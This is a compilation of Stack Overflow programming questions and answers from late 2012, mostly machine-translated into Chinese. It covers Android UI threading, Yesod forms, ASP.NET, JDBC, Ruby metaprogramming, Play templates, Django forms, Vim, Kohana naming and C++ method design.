> ID：14074570
> 
> 赞同：2
> 
> 时间：2012-12-28T19:19:01.780
> 
> 标签：android, textview

I am trying to create a loop that will update a TextView. The idea is to create some sort of progress indicator, that will increment the loading precentge.

This is what I have tried, but the result is that I see only the last update of the loop, so I get "100%" with no incremntation.

```
 runOnUiThread(new Runnable() {
                         public void run() {
                            final TextView progesss = (TextView)findViewById(R.id.progress);
                            for(int k=1 ; k<=100; k++)
                            {
                                progesss.setText(String.valueOf(k) + "%");

                                try {
                                    Thread.sleep(15);
                                    } catch(InterruptedException e) {
                                    } 
                            }
                         }
                     }); 
```

Any ideas of how to achieve my goal? Thanks!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:21:00.217

Your `Runnable` blocks the *UI thread* when doing `Thread.sleep`. Instead of sleeping, you should post a new `Runnable` again. Try with something like this:

```
final Handler handler = new Handler();
handler.post( new Runnable(){ 
    private int k = 0;

    public void run() {
        final TextView progess = (TextView)findViewById(R.id.progress);
        progess.setText(String.valueOf(k) + "%");

        k++;
        if( k <= 100 )
        {
            // Here `this` refers to the anonymous `Runnable`
            handler.postDelayed(this, 15);
        }
    }
}); 
```

That will give the *UI thread* a chance to run between each call, letting it do its stuff like handling input and drawing stuff on the screen.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:27:52.317

You use background thread and UI Thread.

```
public class testAsync extends AsyncTask<Void, Integer, Voi>{

TextView progress; // You will set TextView referans

protected void doInBackground(){

 for(int k=1 ; k<=100; k++)

  {

    try {
    Thread.sleep(1000);
    publishProgress(k); 
   } catch(InterruptedException e) {}
   }
 }
protected void onProgressUpdate(Integer.. values)
{
progress.setText(values[0]+");
}

}

} 
```

# json - Yesod 类型的自定义字段 [Double]

> ID：14074572
> 
> 赞同：2
> 
> 时间：2012-12-28T19:19:20.970
> 
> 标签：json, forms, field, yesod

我想在 Yesod 中创建一个自定义字段，它是一个带有双精度 JSON 数组的文本字段。但是我不断收到类型错误。我目前的尝试是：

```
 doubleListField :: RenderMessage master FormMessage => Field sub master [Double]
    doubleListField = Field
        { fieldParse = parseHelper $ Right . decodeUtf8 . parse json

        , fieldView = \theId name attrs val isReq -> toWidget [hamlet|
        $newline never
    <input id="#{theId}" name="#{name}" *{attrs} type="number" :isReq:required="" value="Hey">
    |]
         } 
```

（找到正确的空格：[https](https://gist.github.com/4394850) ://gist.github.com/4394850 ）

我目前失败了：

```
 Couldn't match expected type `Data.ByteString.Internal.ByteString'
            with actual type `[Text]
                              -> m0 (Either (SomeMessage master0) (Maybe Text))'
In the second argument of `($)', namely `parseHelper $ Right'
In the `fieldParse' field of a record
In the expression:
  Field
    {fieldParse = parse json $ parseHelper $ Right,
     fieldView = \ theId name attrs val isReq
                   -> toWidget (\ _render_a5Cg -> ...)} 
```

fieldView 我会修改，我知道该怎么做，但我对 fieldParse 的外观感到困惑。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-06T18:07:19.033

请注意，您的代码与错误不匹配。

该`fieldParse`函数应该将用户提交的数据转换为 Haskell 结构。正如您所发现的，有一个`parseHelper`函数可以简化字段的创建。

的类型`parseHelper`本质上是`(Text -> Either FormMessage a) -> X`，其中`X`的确切类型是`fieldParse`。也就是说，一旦你将一个参数传递给助手，你就会得到一个正确的`fieldParse`.

to 的参数`parseHelper`应该是一个函数，它接收`Text`输入并返回`Right [Double]`或者`Left FormMessage`如果解析失败。

根据您用于解析 JSON 的内容，该函数可能如下所示（假设存在您很可能需要编写的更多帮助程序）：

```
fieldParse = parseHelper $ \text -> case parse json text of
    Right value | isListOfDoubles value -> Right $ extractListOfDoubles value
    _ -> Left "Wrong input" 
```

# c# - ASP.NET 包装一个 asp:HyperLink in 的，从服务器端

> ID：14074575
> 
> 赞同：1
> 
> 时间：2012-12-28T19:19:27.503
> 
> 标签：c#, asp.net, asp.net-controls

我有一个菜单项的下一个结构：

```
class MenuItem
{
    public string Path, Title;
} 
```

我希望能够迭代一个对象`MenuItem[]`，在每次迭代时创建一个新对象`asp:HyperLink`，并将其添加到`<ul>`列表中。

必须发生的一件事是每个超链接都将位于`<li>`标签内。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:32:14.490

您可以使用中继器。在 aspx 中：

```
<asp:Repeater ID="repMenuItems" runat="server">
    <HeaderTemplate>
        <ul>
    </HeaderTemplate>
    <ItemTemplate>
        <li><asp:HyperLink ID="lnkMenuItem" runat="server" Text='<%# Eval("Title") %>' NavigateUrl='<%# Eval("Path")%>'/></li>
    </ItemTemplate>
    <FooterTemplate>
        </ul>
    </FooterTemplate>
</asp:Repeater> 
```

在代码隐藏中：

```
repMenuItems.DataSource = arrMenuItem;  // your MenuItem array
repMenuItems.DataBind(); 
```

另外，您应该更改类代码以使用公共属性而不是公共成员，如下所示：

```
public class MenuItem 
{ 
    public string Title {get;set;} 
    public string Path {get;set;} 
} 
```

我建议您阅读更多关于 .NET 中的属性，这是一个很好的对象封装特性[http://msdn.microsoft.com/en-us/library/65zdfbdt(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/65zdfbdt(v=vs.71).aspx)

希望这可以帮助你

# windows-8 - 使用 VS2012 Remote Debugging 开发使用 Windows 7 的 Surface 应用程序

> ID：14074578
> 
> 赞同：0
> 
> 时间：2012-12-28T19:19:41.693
> 
> 标签：windows-8, visual-studio-2012, remote-debugging

是否可以使用 Surface RT 和 VS2012 远程调试在 Windows 7 设备上开发 Windows Store 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:01:32.057

不，您需要一台 Windows 8 机器进行开发。

# java - MySQL 和 JDBC 错误登录

> ID：14074583
> 
> 赞同：0
> 
> 时间：2012-12-28T19:19:57.540
> 
> 标签：java, jdbc

我一直在搞乱 JDBC 并尝试连接到我创建的测试数据库，但是我不断收到此错误：

```
java.sql.SQLException: Access denied for user 'root'@'localhost' (using password: YES) 
```

我不知道如何解决这个问题，我尝试了两种代码变体，它们都在这里抛出相同的错误：

```
 public static void main(String[] args){
       Connection connection = null;
       Statement statement = null;
       try{
           Class.forName("com.mysql.jdbc.Driver");
           connection = DriverManager.getConnection("jdbc:mysql://localhost/feedback?   user=root&password=1234");
           System.out.print("Connected");
           connection.close();
           System.out.println("Closed");
       }catch(Exception e){
           System.out.println("Error: " + e);
       }
   } 
```

也：

```
public class JDBC {
public static void main(String[] args) throws SQLException {
    String driver = "com.mysql.jdbc.Driver";
    String url = "jdbc:mysql://localhost:3306/test";
    String user = "root";
    String password = "1234";
    System.setProperty(driver, "");

    try {
        DriverManager.getConnection(url,user,password);
    } catch (SQLException e) {
        System.out.println("Error: " + e);
    }
  }
} 
```

谁能给我一个关于从这里开始的指示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:30:58.980

消息非常具有描述性，似乎用户 ID、密码（或）两者的组合不匹配

编辑：

截图问题与程序中错误的端口定义有关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:43:15.367

试试这个 -

1.  重置root密码。检查您的连接 URL。
2.  如果 #1 不起作用，则不要使用 root，而是创建具有完全访问权限的新用户。

# ruby - 在ruby中从自身获取实例变量名

> ID：14074586
> 
> 赞同：5
> 
> 时间：2012-12-28T19:20:20.117
> 
> 标签：ruby, metaprogramming

我有一个实例变量`@foo`，我想编写一些代码以便获得字符串`'foo'`

任何提示？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T19:27:22.717

如果您所拥有的只是对该对象的引用，那么您就不能真正做到干净利落。

```
def foo
  bar @something
end

def bar(value)
  value # no clean way to know this is @something
end 
```

* * *

我能想到的唯一技巧是遍历所有实例变量`self`，寻找匹配项。但这是一种非常混乱的方法，可能会很慢。

```
def bar(value)
  instance_variables.each do |ivar_name|
    if instance_variable_get(ivar_name) == value
      return ivar_name.to_s.sub(/^@/, '') # change '@something' to 'something'
    end
  end

  # return nil if no match was found
  nil 
end

@something = 'abc123'
bar @something # returns 'something'

# But passing the same value, will return a value it's equal to as well
bar 'abc123' # returns 'something' 
```

这是有效的，因为`instance_variables`返回一个符号数组，这些符号是实例变量的名称。

```
instance_variables
#=> [:@something, :@whatever] 
```

并`instance_variable_get`允许您按名称获取值。

```
instance_variable_get :@something # note the @
#=> 'abc123' 
```

结合这两种方法，你可以接近你想要的。

* * *

只要明智地使用它。在使用基于此的解决方案之前，请查看您是否可以通过某种方式重构事物以使其不再需要。元编程就像一门武术。您应该知道它是如何工作的，但要有纪律，尽可能避免使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T21:28:40.283

您可以调用该方法`instance_variables`来获取对象的所有实例变量的名称。请注意，尽管实例变量仅在初始化*后才包含在该列表中。*

```
>> class A; attr_accessor :foo; end
=> nil
>> a = A.new
=> #<A:0x103b310b0>
>> a.instance_variables
=> []
>> a.foo = 42
=> 42
>> a.instance_variables
=> ["@foo"] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T20:18:07.463

在 Ruby 中，您只能操作对象。变量（包括实例变量）不是对象。

此外，在这种情况下，您希望您的魔术方法返回什么：

```
foo = Object.new
bar = foo
@baz = bar
@qux = bar

magic_method(foo) # what should the return value be and how would it know? 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2019-11-04T23:40:14.730

```
class Object
    def get_name
      line_number = caller[0].split(':')[1].to_i
      line_exectued = File.readlines( __FILE__)[line_number-1]
      line_exectued.match(/(\S+).get_name/)[1]
    end
end

inconceivable = true

p inconceivable.get_name 
```

# c# - 如何以指数方式表示 c# 图表轴值？

> ID：14074587
> 
> 赞同：3
> 
> 时间：2012-12-28T19:20:31.900
> 
> 标签：c#, asp.net, charts

如何以指数模型而不是线性表示形式显示 ASP.NET 图表轴值？因此，我不想显示 0、1、10、100、1000 等，而是要显示 0、1、10、10^2、10^3。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:27:59.460

如果您在谈论`System.Web.UI.DataVisualization.Charting.Chart`控件，则`Axis`成员`ChartArea`具有一个`IsLogarithmic`属性：

```
chart.ChartAreas[0].AxisX.IsLogarithmic = true; 
```

# powershell - 在代码中远程调用 Exchange Powershell 命令时出错（c#）

> ID：14074588
> 
> 赞同：1
> 
> 时间：2012-12-28T19:20:39.060
> 
> 标签：powershell, sdk

我正在发布问题和解决方案。我很想在半天前知道这一点。

## 错误：

> “不能从 BeginProcessing、ProcessRecord 和 EndProcessing 方法的覆盖范围之外调用 WriteObject 和 WriteError 方法，只能从同一个线程调用。验证 cmdlet 是否正确进行了这些调用，或者请联系 Microsoft 支持服务。”

## 错误：

```
foreach (KeyValuePair<string, string> cp in args.CP)
{
   command.AddCommand(args.Command);
   command.AddParameter(cp.Key, cp.Value);
} 
```

## 已解决，解决方案：

```
command.AddCommand(args.Command);
foreach (KeyValuePair<string, string> cp in args.CP)
{
    command.AddParameter(cp.Key, cp.Value);
} 
```

对我来说，这个错误仍然没有发生。我开始切线看 PS 异步的东西。

希望这对其他人有帮助...

# playframework - Playframework 2.0.x 是否支持 在模板中

> ID：14074590
> 
> 赞同：40
> 
> 时间：2012-12-28T19:20:51.620
> 
> 标签：playframework

`else if`我想知道是否在视图中支持播放 2.0.3 及更高版本？我只读到必须以这种方式编码：`if {...}else{if{...}else{...}}` 不敢相信。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-08-05T14:04:25.860

我在第二个 if 之前使用了 @ ：

```
@if (true) {
...
} else { @if (true) {
...
} else {
...
}} 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2015-04-06T13:41:52.863

@Todd Flanders 的答案是正确的。在包装器 @{} 中，您可以编写普通的 Scala 代码。例子

```
@{
  if (profile.sex == 0) {
    <p class="col-md-6">Other</p>
  } else if (profile.sex == 1) {
    <p class="col-md-6">Male</p>
  } else {
    <p class="col-md-6">Female</p>
  }
} 
```

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2012-12-29T06:10:40.583

我也能够得到

```
@{if (true) "foo" else if (true) "bar" else "baz"} 
```

去工作。请记住，大多数编程语言不支持将“else if”作为词法标记。它们是单独的命令。“else”命令执行的代码块恰好是“if”语句。

另请注意，您可以将 XHTML 与该子句混合使用：

```
 @{if (true) <b>foo</b> else if (false) "bar" else "baz"} 
```

我同意 biesior 的观点，将状态逻辑推送到控制器中通常是个好主意，然后您可以为不同的状态提供不同的视图，共享组件具有自己的子视图。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2012-12-28T19:41:09.917

不，它没有。它只允许你`if(condition) {then...} else {otherwise...}`

要获得更多可能性，您需要使用[模式匹配](http://www.playframework.org/documentation/2.0/ScalaTemplates)（类似于 PHP 的`switch()`）

在这种情况下`_`是默认选项。

来自以前版本的 Play Autheticate 的示例（现在控制器中的反射也是如此）

```
@(url: String, token: String, name: String)

@defining(lang().code) { langcode =>

    @langcode match {
        case "de" => {@_password_reset_de(url,token,name)}
        case "pl" => {@_password_reset_pl(url,token,name)}
        case _ => {@_password_reset_en(url,token,name)}
    }

} 
```

因此，也许对您来说最好的选择是解决控制器中的条件并将其作为参数传递给视图？

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-02-10T10:11:38.607

现在`if else if`在最新的 playframework 中得到支持。讨论在这里[https://github.com/playframework/twirl/issues/33](https://github.com/playframework/twirl/issues/33)

你可以这样使用：

```
@if(something) {
  ...
} else if (somethingElse) {
  ...
} else {
  ...
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-12-17T07:18:35.767

您可以使用`switch statement`in`Scala`来实现它。
例子：

```
if(x>2){
   <block 1>

} else if(x>0) {
   <block 2>

} else {
   <block 3>
} 
```

翻译：

```
x match {
   case x if(x>2) => {<block 1>}
   case x if(x>0) => {<block 2>}
   case _ => {<block 3>}
} 
```

希望在某些情况下可以帮助您，并希望游戏框架能`else if`尽快支持。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-29T07:40:26.893

不，scala 模板不支持“else if”：[Play framework 2.0 是否支持模板中的嵌套 if 语句？](https://stackoverflow.com/questions/13945916/does-play-framework-2-0-support-nested-if-statement-in-template/13946078#13946078)

您可以使用模式匹配，也可以将 if 放入 else 中。

# c - 根据条件应用/删除位掩码

> ID：14074593
> 
> 赞同：3
> 
> 时间：2012-12-28T19:20:56.847
> 
> 标签：c, bitmask

我想简化以下表达式（`block`是一个整数，`0`或者`1`）：

```
if (block)
    opts = opts & ~O_NONBLOCK;
else
    opts = opts | O_NONBLOCK; 
```

这就是我想出的：

```
opts = block ? opts & ~O_NONBLOCK : opts | O_NONBLOCK; 
```

然而，我敢肯定，有一种非常聪明的方法可以做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:23:24.647

这个怎么样？

```
opts = (opts & ~O_NONBLOCK) | (!block * O_NONBLOCK); 
```

不过，我确实更喜欢你的第一个选项的明确性，而不是这个有点神秘的解决方案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:24:56.303

你的第一个例子尽可能简单，当然更能解释发生了什么。

如果由于某种原因您迫切希望输入更少的字符，您*可以*使用赋值运算符，我想：

```
if (block)
    opts &= ~O_NONBLOCK;
else
    opts |= O_NONBLOCK; 
```

如果可以避免的话，我当然不会走三元运算符路线。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:24:39.217

在第一个版本中，您还可以使用运算符的复合赋值版本

```
if (block)
    opts &= ~O_NONBLOCK;
else
    opts |= O_NONBLOCK; 
```

:)

虽然我通常更喜欢`?:`operator 而不是`if`尽可能和适当的。然而，在这种特定情况下，很难说什么看起来更优雅。

# sql-server - SQL Server connectionStringName 需要 WebSecurity

> ID：14074598
> 
> 赞同：0
> 
> 时间：2012-12-28T19:21:10.047
> 
> 标签：sql-server, visual-studio, security

我真的很抱歉，但我想我无法弄清楚一件非常琐碎的事情。我正在尝试开始使用 WebSecurity (asp.net MVC)，但初始方法要求提供连接字符串。

*   我安装了 SQL Server 2012 版本。
*   创建了一个数据库“用户”

在哪里可以找到连接字符串？

（我确实首先使用 EF 代码创建了一个数据库 + 表，所以我知道安装正确）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:25:12.250

您需要获取安装的详细信息（用户 ID、密码和服务器名称），但该网站可以提供语法/格式方面的帮助：

[http://www.connectionstrings.com/sql-server-2012](http://www.connectionstrings.com/sql-server-2012)

# django-models - 尝试使用自定义基础 ModelForm 或自定义 error_class 时出现 Django TypeError

> ID：14074602
> 
> 赞同：0
> 
> 时间：2012-12-28T19:21:52.850
> 
> 标签：django-models, python-2.7, django-forms

我想在表单中进行 error_class 渲染。我看到了这个定义并将其放入我的应用程序目录中的一个文件中：

```
from django.forms.util import ErrorList
class DivErrorList(ErrorList):
    def __unicode__(self):
        return self.as_divs()
    def as_divs(self):
        if not self: return u''
        return u'<div class="errorlist">%s</div>' % \
               ''.join([u'<div class="error">%s</div>' % e for e in self]) 
```

但是，当我尝试在我的视图中使用它时：

```
from sporty import DivErrorList
...
form = LocationForm(request.POST or None, error_class=DivErrorList)
if form.is_valid(): 
```

提交表单时出现此错误：TypeError: 'module' object is not callable /usr/local/lib/python2.7/dist-packages/django/forms/forms.py in _clean_fields，第 293 行。

这是在 form.is_valid() 行。如果我不使用 error_class，它可以正常工作（只有没有所需的 .

接下来，我尝试在我的应用程序目录中创建一个使用 DivErrorList 的基本 ModelForm 类：

```
from django.forms import ModelForm
from sporty import DivErrorList

class MyModelForm(ModelForm):
    def __init__(self, *args, **kwargs):
        kwargs_new = {'error_class': DivErrorList}
        kwargs_new.update(kwargs)
        super(MyModelForm, self).__init__(*args, **kwargs_new) 
```

然后我基于该类定义了我的 ModelForm 并且不再在表单创建中使用 error_class 参数：

```
from sporty import MyModelForm
from sporty.models import Location

class LocationForm(MyModelForm):
    class Meta:
        model = Location 
```

现在，当我尝试查看表单（不提交任何数据）时，我收到此错误：TypeError：调用元类基础模块时出错。**init** () 最多接受 2 个参数（给定 3 个） /home/pcm/workspace/sportscaster/sporty/forms.py 在第 5 行

我对这两个都不知所措。有任何想法吗？我更喜欢后者，因为我的所有表单都希望用于错误报告（在某些方面，我也希望将表单实际呈现为 div。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T16:16:28.200

谷歌搜索，我发现了关于类型错误和元类基础的讨论。问题是我在文件 MyModelForm.py 中有一个类 MyModelForm，然后导入模块试图像类一样使用它：

```
from sporty import MyModelForm 
```

解决方案是将 MyModelForm 类放入文件 modelforms.py 并执行以下操作：

```
from sporty.modelforms import MyModelForm 
```

我对 DivErrorList 做了同样的事情，将类放在 modelforms.py 文件中。

# vim - 使用 ":" 使 vim 始终处于命令行模式

> ID：14074603
> 
> 赞同：3
> 
> 时间：2012-12-28T19:22:16.863
> 
> 标签：vim, command, mode

有没有办法让 vim 在`:`已经输入的情况下卡在命令模式？

以这种方式，例如：

*   我会键入`/foo``Enter`，光标会转到下一行的开头，其中包含`foo`.
*   接下来，我将仍然处于命令行模式，并且`:`已经输入了下一个命令。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T19:43:34.203

是的，以 Ex 模式启动它，方法是调用它 as`ex`或 as `vi -e`。

您还可以通过键入 Q（必须为大写）从正常的可视模式进入 Ex 模式。

您可以使用该`vi`命令从 Ex 模式返回到正常可视模式。

**编辑**：这实际上并没有做 OP 正在寻找的东西。他希望在将光标保持在底部命令行上的同时保持视觉显示。那可能是不可能的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:28:20.203

不，但你可以映射；to ：让自己“更接近”命令模式。

我将链接到 Vim wiki，而不是在这里重新发布相同的信息。

[http://vim.wikia.com/wiki/Map_semicolon_to_colon](http://vim.wikia.com/wiki/Map_semicolon_to_colon)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-29T01:12:05.543

您可以构建自己的*REPL*，如下所示：

```
:while 1 | execute input(':') | redraw | endwhile 
```

这只是一个概念演示；您可能想添加一个条件来退出此特殊模式。此外，像`:append`这样的命令需要特殊处理才能正常工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-29T02:16:09.007

作为最后一次尝试，我可以初始化 vim，`-servername=FOO`然后编写一个小脚本，该脚本将从 stdin 读取并`remote-send`在检测到（通过解析）在 stdin 上键入整个命令时发送到 FOO。

然后我会在不同的 xterms/gnu 屏幕上并排使用 Vim 和这个其他脚本。

> 编辑
> 
> 好的，我会用这个。这样，我什至可以`:a`命令进入 vim 的插入模式，并在输入带有单个`.`. 这样我在插入文本时也会有语法高亮显示（你知道，vim 有一个非常漂亮的文本可视化显示，我只是太习惯于 ed 的界面）。当我有时间时，我会编写这个脚本并将其链接到这里。

# namespaces - Kohana 3.3 大写/小写转换

> ID：14074605
> 
> 赞同：1
> 
> 时间：2012-12-28T19:22:37.760
> 
> 标签：namespaces, kohana, filenames, kohana-3, kohana-3.3

我刚刚将在 Kohana3.3 上创建的项目从 Windows 移动到 Ubuntu（本地服务器），但它停止了工作。我相信问题是大写/小写问题（它表示 Table.__ 或 Model_ 它们不存在）。

我需要一些关于大写/小写文件名和类名的解释。

我发现的是这样的[问题： Kohana 3.3 Not working from Subdirectory](https://stackoverflow.com/questions/13121861/kohana-3-3-not-working-from-subdirectory)：

*Kohana 3.3 添加了对 PHP Framework Interop Group 的 PSR-0 标准的部分支持。鼓励 PHP 框架开发人员遵循此标准以简化框架之间的交互。PSR-0 的要求之一是类名和文件名匹配。*

另外，我看到 Kohana3.3 中的 Controller 文件夹以大写字母 C 开头（不像 3.2 中那样）。此外，Welcome.php 文件以 W 开头（不像 3.2 中那样）。

所以，我对 Kohana3.3 的简单问题是：

模型文件夹应该以大写字母开头吗？

所有控制器文件都应该以大写字母开头吗？

Model 文件夹中的所有模型文件都应该以大写字母开头吗？

我应该写 ORM::factory('Capital')，而不是 ORM::factory('capital')？

视图文件夹呢：是视图还是视图？

我已经阅读了一些关于 Kohana 的示例，但从我发现的内容来看，我怀疑它是否适用于 3.3。

另外，我的问题是：为什么它在 Windows 下工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:38:06.550

您可以通过简单地[阅读文档](http://kohanaframework.org/3.3/guide/kohana/upgrading#psr-0-support-fileclass-naming-conventions)和/或只是试验并查看哪些有效，哪些无效。

简而言之，在 PSR-0 中文件名必须与类名**完全相同。**所以，如果你调用一个名为的类，`Penguins_CanNot_Fly`那么文件名应该是`Penguins/CanNot/Fly.php`.

在 Linux 上，文件名区分大小写。所以，`File.txt`和`file.txt`是两个不同的文件。然而，在 Windows 上，这两个文件被认为是同一个文件（这是因为 windows 不区分大小写）。这意味着 PSR-0 在 Windows 上无法正常工作，除非您修改自动加载器以检查确切的文件路径。

至于 ORM，是的，您需要记住模型应该区分大小写。`ORM::factory('Blog')`并将`ORM::factory('blog')`加载不同的模型，但将使用同一个表。

# image-processing - sobel算子掩码矩阵是如何创建的？

> ID：14074607
> 
> 赞同：1
> 
> 时间：2012-12-28T19:22:49.680
> 
> 标签：image-processing

[http://www.cis.rit.edu/people/faculty/rhody/EdgeDetection.htm](http://www.cis.rit.edu/people/faculty/rhody/EdgeDetection.htm)

这似乎是唯一一篇试图描述 sobel 算子如何来自方程的文章。但我当然不了解这些方面。

在那个页面中，他们让

```
A = array of actual image , B = grayscale version

Horizontal gradient B(j ,k) = taking column values = A ( j,k+1 ) - A (j,k) 
```

我的问题，为什么将列值作为水平？

然后他们又说：

```
This can be represented by a filter array as shown below: as a matrix [-1,1] 
```

这个过滤器数组是如何从那个方程来的？另外，我很难理解为什么 [-1,1] 变成 [-1,0,1] 然后这个水平和垂直矩阵没有“相乘”以获得 sobel 算子，它们是二维的乘积卷积运算。这意味着什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-29T19:39:47.420

考虑一个样本数组，`A = [1,4,9,16,25]`。

我们需要根据您提到的文章找到该数组的水平导数。

当我们谈论水平导数时，我们需要在一行中的元素之间取差。即数据如何连续变化，即水平导数。类似地，列中数据的变化是垂直导数。

第一个方程是：**`B[j,k] = A[j,k+1] - A[j,k]`**

=> `B[0,0] = A[0,1] - A[0,0]`=> B[0,0] = 4-1 => 3

=> `B[0,1] = A[0,2] - A[0,1]`=> B[0,1] = 9-4 => 5

=> `B[0,2] = A[0,3] - A[0,2]`=> B[0,2] = 16-9 => 7

=> `B[0,3] = A[0,4] - A[0,3]`=> B[0,3] = 25-16 => 9

所以最后**`B = [3,5,7,9]`**

应用上述等式与将 A 与 [-1,1] 卷积相同。

举个例子，`B[0,3] = -1xA[0,3] + 1xA[0,4]`=> -1x16 + 1x25 => 9

* * *

现在我们尝试第二个方程：**`B[j,k] = A[j,k+1] - A[j,k-1]`**

=> `B[0,1] = A[0,2] - A[0,0]`=> B[0,1] = 9-1 => 8

=> `B[0,2] = A[0,3] - A[0,1]`=> B[0,2] = 16-4 => 12

=> `B[0,3] = A[0,4] - A[0,2]`=> B[0,3] = 25-9 => 16

所以最后，**`B = [8,12,16]`**

此操作与将 A 与 [-1,0,1] 卷积相同。

举个例子，`B[0,3] = -1xA[0,4] + 0xA[0,3] + 1xA[0,2]`=> -1x9 + 0x16 + 1x25 => 16

* * *

垂直导数的情况也类似。

（如果需要更多细节，请发表评论。）

# c++ - 类中的静态方法与本地方法

> ID：14074609
> 
> 赞同：3
> 
> 时间：2012-12-28T19:23:18.583
> 
> 标签：c++

首先，为了解决我的顾虑，看一下我准备的这两个代码段：

```
struct Quaternion
{
public:

    float X, Y, Z, W;

    Quaternion(float x, float y, float z, float w)
        :
        X(x), Y(y), Z(z), W(w)
    {}

    void Normalise()
    {
        float num = (((this->X * this->X) + (this->Y * this->Y)) +
            (this->Z * this->Z)) + (this->W * this->W);
        float num2 = 1.0f / (static_cast<float>(std::sqrt(static_cast<double>(num))));
        this->X *= num2;
        this->Y *= num2;
        this->Z *= num2;
        this->W *= num2;
    }

    void Conjugate()
    {
        this->X = -this->X;
        this->Y = -this->Y;
        this->Z = -this->Z;
    }
}; 
```

以上是我在标题中提到的类中的“本地方法”。现在让我们看看我所说的类中的“静态方法”是什么意思。

```
struct Quaternion
{
public:

    float X, Y, Z, W;

    Quaternion(float x, float y, float z, float w)
        :
        X(x), Y(y), Z(z), W(w)
    {}

    static Quaternion& Normalise(Quaternion& quat)
    {
        float num = (((quat.X * quat.X) + (quat.Y * quat.Y)) +
            (quat.Z * quat.Z)) + (quat.W * quat.W);
        float num2 = 1.0f / (static_cast<float>(std::sqrt(static_cast<double>(num))));
        // Assuming operator= overloaded..
        quat = Quaternion(quat.X * num2, quat.Y * num2, quat.Z * num2, quat.W * num2);
        return quat;
    }

    static Quaternion& Conjugate(Quaternion& quat)
    {
        // Assuming operator= overloaded..
        quat = Quaternion(-quat.X, -quat.Y, -quat.Z, quat.W);
        return quat;
    }
}; 
```

我的问题是.. 权衡是什么？效果？要使用这些静态类方法而不是本地方法。两者都有相似的用法：

编辑：忽略 *.ToString 功能，它是伪代码 - 我相信你可以想象它会做什么；因此它的实现是多余的，因为它只是打印出原始的 X、Y、Z、W 值。

“本地方法”类用法：

```
int main()
{
    Quaternion testQuat(6.0f, 6.0f, 6.0f, 1.3f);

    std::cout << testQuat.ToString(); // (6, 6, 6, 1.3)

    testQuat.Conjugate();

    std::cout << testQuat.ToString(); // (-6, -6, -6, 1.3)

    return 0;
} 
```

现在“静态方法”类的用法：

```
int main()
{
    Quaternion testQuat(6.0f, 6.0f, 6.0f, 1.3f);

    std::cout << testQuat.ToString(); // (6, 6, 6, 1.3)

    testQuat = Quaternion::Conjugate(testQuat);

    std::cout << testQuat.ToString(); // (-6, -6, -6, 1.3)

    return 0;
} 
```

So what is the difference? These are static methods not objects. Which is preferable? Is it just a matter of design choice?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:29:05.453

They are two totally different things. One of them modifies the object in place *a la OOP*, the other returns a different object *a la functional style*. If it was my choice, I would keep both of them as there are use cases for both of them. And I would implement the functional styles as *free functions* based on the *member functions*, i.e.:

```
Quaternion normalize( Quaternion quat )
{
    quat.normalize();
    return quat;
} 
```

*[I'm explicitly taking `quat` by value here, gives a chance for copy-elision]*

Note that your static implementations are wrong, they are returning a reference to a temporary. That's undefined behavior, you should get a warning from your compiler and if you are lucky enough a runtime crash as well.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:38:27.023

First off, your second approach shouldn't compile although I think MSVC++ has an error allowing temporary objects to be bound to non-`const` references. Even adding `const&` doesn't make the functions better: They still don't work because the caller gets hold of a reference to a temporary. So much for the implementation.

With respect to interface design, I think the real trade-off isn't between `static` members (you can have them additionally, if you want to) but whether the functions taking no parameters should mutate the object themselves or should return a correspondingly modified object:

```
// return a copy:
Quaternion Quaternion::conjugate() const {
    return Quaternion(-this->X, -this->Y, -this->Z, this->W);
}

// modify the object itself:
void Quaternion::conjugate() {
    this->X = -this->X;
    this->Y = -this->Y;
    this->Z = -this->Z;
} 
```

Although these two overload actually *can* live in the same class I would **not** provide both of them! It is a choice of interface which one is preferable. I would personally prefer the latter and probably create a `static` member mutating the object itself:

```
/* static */ void Quaternion::conjugate(Quaternion& object) {
    object = object.conjugate();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:43:31.713

Besides the other answers about differences between the two approaches, the static methods are difficult to mock/stub if you want to employ in unit tests.

For example, suppose that you have a class named ClassThatUsesQuaternion that uses Quaternion. If Quaternion have a lot of static methods you will always have real data. On the other hand, if you transform Quaternion methods into virtual methods, you will be able to redefining all methods, creating a environment test under your control. You can even add a mock framework like gmock to put your expectations.

# objective-c - 如何在没有 init() 方法的情况下创建新实例？

> ID：14074611
> 
